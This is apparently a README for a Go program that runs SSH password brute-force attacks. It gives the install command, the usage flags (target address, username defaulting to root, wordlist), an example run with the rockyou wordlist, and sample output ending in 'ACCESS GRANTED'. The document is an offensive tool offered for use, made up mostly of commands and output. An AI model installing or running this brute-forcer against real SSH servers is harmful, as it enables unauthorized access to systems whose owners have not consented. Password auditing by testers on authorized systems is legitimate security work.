# sshbrute

This is a program written in Golang for ssh brute force attacks, needs improvements but works well and is fast.

```sh
go get github.com/aldenso/sshgobrute
```

```sh
sshgobrute --help
```

```txt
Usage of sshbrute:
  -a string
        indicate the target address (default "127.0.0.1:22")
  -d    debug mode, print logs to stderr
  -t duration
        set timeout for ssh dial response. do not set this too low! (default 300ms)
  -u string
        indicate user to use (default "root")
  -w string
        indicate wordlist file to use (default "wordlist.txt")
```

```sh
sshbrute -u username -t=200ms -a localhost:2222 -w rockyou.txt
```

will give you some nice colored output where FAIL is red and ACCESS GRANTED is green and the password try is blue. (can't be seen here but trust me)
```
target: username@localhost:2222
timeout: 200ms
wordlist: rockyou.txt
123456 FAILED
12345 FAILED
123456789 FAILED
password FAILED
iloveyou FAILED
princess FAILED
1234567 FAILED
rockyou FAILED
12345678 FAILED
abc123 ACCESS GRANTED
```

If the sshd is using "PasswordAuthentication no" it won't work.
